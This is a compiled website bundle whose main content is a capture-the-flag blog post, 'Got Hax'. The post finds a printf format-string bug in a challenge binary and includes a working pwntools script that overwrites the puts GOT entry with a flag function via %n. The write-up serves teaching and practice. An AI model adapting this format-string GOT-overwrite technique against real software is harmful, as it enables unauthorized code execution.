"use strict";(self.webpackChunkchristopher_nguyen_re=self.webpackChunkchristopher_nguyen_re||[]).push([[7272],{3905:(e,t,n)=>{n.d(t,{Zo:()=>u,kt:()=>g});var r=n(7294);function a(e,t,n){return t in e?Object.defineProperty(e,t,{value:n,enumerable:!0,configurable:!0,writable:!0}):e[t]=n,e}function o(e,t){var n=Object.keys(e);if(Object.getOwnPropertySymbols){var r=Object.getOwnPropertySymbols(e);t&&(r=r.filter((function(t){return Object.getOwnPropertyDescriptor(e,t).enumerable}))),n.push.apply(n,r)}return n}function i(e){for(var t=1;t<arguments.length;t++){var n=null!=arguments[t]?arguments[t]:{};t%2?o(Object(n),!0).forEach((function(t){a(e,t,n[t])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(n)):o(Object(n)).forEach((function(t){Object.defineProperty(e,t,Object.getOwnPropertyDescriptor(n,t))}))}return e}function l(e,t){if(null==e)return{};var n,r,a=function(e,t){if(null==e)return{};var n,r,a={},o=Object.keys(e);for(r=0;r<o.length;r++)n=o[r],t.indexOf(n)>=0||(a[n]=e[n]);return a}(e,t);if(Object.getOwnPropertySymbols){var o=Object.getOwnPropertySymbols(e);for(r=0;r<o.length;r++)n=o[r],t.indexOf(n)>=0||Object.prototype.propertyIsEnumerable.call(e,n)&&(a[n]=e[n])}return a}var s=r.createContext({}),p=function(e){var t=r.useContext(s),n=t;return e&&(n="function"==typeof e?e(t):i(i({},t),e)),n},u=function(e){var t=p(e.components);return r.createElement(s.Provider,{value:t},e.children)},c={inlineCode:"code",wrapper:function(e){var t=e.children;return r.createElement(r.Fragment,{},t)}},h=r.forwardRef((function(e,t){var n=e.components,a=e.mdxType,o=e.originalType,s=e.parentName,u=l(e,["components","mdxType","originalType","parentName"]),h=p(n),g=a,d=h["".concat(s,".").concat(g)]||h[g]||c[g]||o;return n?r.createElement(d,i(i({ref:t},u),{},{components:n})):r.createElement(d,i({ref:t},u))}));function g(e,t){var n=arguments,a=t&&t.mdxType;if("string"==typeof e||a){var o=n.length,i=new Array(o);i[0]=h;var l={};for(var s in t)hasOwnProperty.call(t,s)&&(l[s]=t[s]);l.originalType=e,l.mdxType="string"==typeof e?e:a,i[1]=l;for(var p=2;p<o;p++)i[p]=n[p];return r.createElement.apply(null,i)}return r.createElement.apply(null,n)}h.displayName="MDXCreateElement"},4614:(e,t,n)=>{n.r(t),n.d(t,{assets:()=>s,contentTitle:()=>i,default:()=>c,frontMatter:()=>o,metadata:()=>l,toc:()=>p});var r=n(7462),a=(n(7294),n(3905));const o={slug:"got_hax",title:"Got Hax",authors:["nguyen"],tags:["Binary Exploitation"]},i=void 0,l={permalink:"/blog/got_hax",editUrl:"https://github.com/facebook/docusaurus/tree/main/packages/create-docusaurus/templates/shared/blog/2022-05-03-got_hax.md",source:"@site/blog/2022-05-03-got_hax.md",title:"Got Hax",description:"Got Hax",date:"2022-05-03T00:00:00.000Z",formattedDate:"May 3, 2022",tags:[{label:"Binary Exploitation",permalink:"/blog/tags/binary-exploitation"}],readingTime:1.425,truncated:!0,authors:[{name:"Christopher Nguyen",title:"Reverse Engineer",url:"https://github.com/christopher-nguyen-re",imageURL:"https://cdn.cnn.com/cnnnext/dam/assets/190517103414-01-grumpy-cat-file-restricted.jpg",key:"nguyen"}],frontMatter:{slug:"got_hax",title:"Got Hax",authors:["nguyen"],tags:["Binary Exploitation"]},prevItem:{title:"Function Overwrite",permalink:"/blog/function_overwrite"},nextItem:{title:"Level 1",permalink:"/blog/level-1"}},s={authorsImageUrls:[void 0]},p=[{value:"The Challenge",id:"the-challenge",level:2},{value:"Analysis",id:"analysis",level:2},{value:"The Solve",id:"the-solve",level:2}],u={toc:p};function c(e){let{components:t,...o}=e;return(0,a.kt)("wrapper",(0,r.Z)({},u,o,{components:t,mdxType:"MDXLayout"}),(0,a.kt)("p",null,"Got Hax"),(0,a.kt)("h2",{id:"the-challenge"},"The Challenge"),(0,a.kt)("p",null,"File can be downloaded ",(0,a.kt)("a",{parentName:"p",href:"/files/got_hax/got_hax"},"here")," (Right click and open in new tab)."),(0,a.kt)("p",null,"The goal of this challenge is to get the flag."),(0,a.kt)("h2",{id:"analysis"},"Analysis"),(0,a.kt)("p",null,"I opened the executable in ghidra and found the function ",(0,a.kt)("inlineCode",{parentName:"p"},"get_your_flag"),". It reads a key file and prints the flag."),(0,a.kt)("p",null,"In ",(0,a.kt)("inlineCode",{parentName:"p"},"main"),", there is a printf vulnerability. A printf call is made using a user provided argument on the command line. If we can overwrite the GOT address for ",(0,a.kt)("inlineCode",{parentName:"p"},"puts")," to be the address for ",(0,a.kt)("inlineCode",{parentName:"p"},"get_your_flag"),", then we will be able to obtain the flag."),(0,a.kt)("p",null,"I ran the executable and sent several ",(0,a.kt)("inlineCode",{parentName:"p"},"%p"),"s as input for printf. I was able to view addresses on the stack and determined that the 6th value was the one that could be overwritten because it is the ASCII value for %p. We are writing this value to the stack."),(0,a.kt)("p",null,(0,a.kt)("img",{alt:"p output",src:n(2014).Z,width:"802",height:"73"})),(0,a.kt)("h2",{id:"the-solve"},"The Solve"),(0,a.kt)("p",null,"I used pwntools to get the ",(0,a.kt)("inlineCode",{parentName:"p"},"puts")," GOT address and replace it with ",(0,a.kt)("inlineCode",{parentName:"p"},"get_your_flag")," using printf's %n vulnerability."),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-python"},"#!/usr/bin/env python3\n\n\"\"\"\nToast's submission for the challenge Got Hax.\n\nThis script can be used in the following manner:\npython3 ./solve.py\n\nReturns:\n    The flag to solve the challenge.\n\"\"\"\n\nfrom pwn import *\n\nexe = ELF(\"./got_hax\")\n\ncontext.binary = exe\ncontext.log_level = 'info'\ncontext.terminal = ['gnome-terminal', '-e']\n\n# Overwrite puts GOT with flag_function\nputs_plt = exe.got['puts']\nget_flag = exe.symbols['get_your_flag']\n\ndef conn():\n    '''Establish the connection to the process\n    '''\n\n    exploit = p32(puts_plt)\n    exploit += b'%' + str(get_flag - 0x4).encode() + b'x%6$n'\n    io = process([exe.path, exploit])\n    return io\n\n\ndef main():\n    '''Return the flag.\n    '''\n\n    with conn() as io:\n        io.sendline(b'1')\n        io.recvuntil(b'You GOT hax! Your flag is ')\n        flag = io.recv()\n        print(f\"Flag is : {flag}\")\n\n\nif __name__ == '__main__':\n    main()\n")))}c.isMDXComponent=!0},2014:(e,t,n)=>{n.d(t,{Z:()=>r});const r=n.p+"assets/images/initial_test-dfb7d9ada773c4e6b330b36a6d47404b.png"}}]);